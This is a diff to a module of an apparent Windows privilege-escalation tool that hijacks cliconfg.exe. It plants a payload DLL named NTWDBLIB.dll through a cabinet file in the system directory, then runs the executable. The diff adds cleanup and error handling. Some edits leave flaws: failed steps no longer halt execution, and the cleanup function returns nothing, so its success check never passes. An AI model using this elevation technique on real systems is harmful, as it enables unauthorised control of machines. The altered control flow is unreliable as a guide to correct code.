@@ -16,18 +16,52 @@ cliconfg_info = {
 }
 
 
+def cliconfg_cleanup():
+	print_info("Performing cleaning")
+	if os.path.isfile(os.path.join(tempfile.gettempdir(), "NTWDBLIB.dll")):
+		try:
+			os.remove(os.path.join(tempfile.gettempdir(), "NTWDBLIB.dll"))
+		except Exception:
+			print_warning("Unable to delete file: ({path})".format(
+							path=os.path.join(tempfile.gettempdir(),
+							"NTWDBLIB.dll")))
+		else:
+			print_success("Successfully deleted file: ({path})".format(
+							path=os.path.join(tempfile.gettempdir(),
+							"NTWDBLIB.dll")))
+	else:
+		pass
+
+	if os.path.isfile(os.path.join(tempfile.gettempdir(), "suspicious.cab")):
+		try:
+			os.remove(os.path.join(tempfile.gettempdir(), "suspicious.cab"))
+		except Exception:
+			print_warning("Unable to delete file: ({path})".format(
+							path=os.path.join(tempfile.gettempdir(),
+							"suspicious.cab")))
+		else:
+			print_success("Successfully deleted file: ({path})".format(
+							path=os.path.join(tempfile.gettempdir(),
+							"suspicious.cab")))
+	else:
+		pass
+
 def cliconfg(payload):
 	if payloads().dll(payload):
 		try:
 			payload_data = open(os.path.join(payload), "rb").read()
-		except Exception as error:
+		except Exception:
+			print_error("Unable to read payload data, cannot proceed")
 			return False
 
 		try:
 			dll_file = open(os.path.join(tempfile.gettempdir(), "NTWDBLIB.dll"), "wb")
 			dll_file.write(payload_data)
 			dll_file.close()
-		except Exception as error:
+		except Exception:
+			print_error("Unable to write payload to disk: ({path})".format(
+						path=os.path.join(tempfile.gettempdir(),
+						"NTWDBLIB.dll")))
 			return False
 
 		time.sleep(5)
@@ -39,10 +73,12 @@ def cliconfg(payload):
 				print_success("Successfully created cabinet file")
 			else:
 				print_error("Unable to create cabinet file")
-				return False
+				if "error" in Constant.output:
+					cliconfg_cleanup()
 		else:
 			print_error("Unable to create cabinet file, dll file is not found")
-			return False
+			if "error" in Constant.output:
+				cliconfg_cleanup()
 
 		time.sleep(5)
 
@@ -53,10 +89,12 @@ def cliconfg(payload):
 				print_success("Successfully extracted cabinet file")
 			else:
 				print_error("Unable to extract cabinet file")	
-				return False
+				if "error" in Constant.output:
+					cliconfg_cleanup()
 		else:
 			print_error("Unable to extract cabinet file, cabinet file is not found")
-			return False
+			if "error" in Constant.output:
+				cliconfg_cleanup()
 
 		time.sleep(5)
 
@@ -65,23 +103,12 @@ def cliconfg(payload):
 			print_success("Successfully disabled file system redirection")
 			if process().create(os.path.join(information().system_directory(), "cliconfg.exe")):
 				print_success("Successfully executed cliconfg executable")
-				if os.path.isfile(os.path.join(tempfile.gettempdir(), "suspicious.cab")) == True:
-					try:
-						os.remove(os.path.join(tempfile.gettempdir(), "suspicious.cab"))
-					except Exception as error:
-						return False
-				else:
-					pass
-				if os.path.isfile(os.path.join(tempfile.gettempdir(), "NTWDBLIB.dll")) == True:
-					try:
-						os.remove(os.path.join(tempfile.gettempdir(), "NTWDBLIB.dll"))
-					except Exception as error:
-						return False
-				else:
-					pass
+				if cliconfg_cleanup():
+					print_success("All done!")
 			else:
 				print_error("Unable to execute cliconfg executable")
-				return False
+				if "error" in Constant.output:
+					cliconfg_cleanup()
 	else:
 		print_error("Cannot proceed, invalid payload")
 		return False
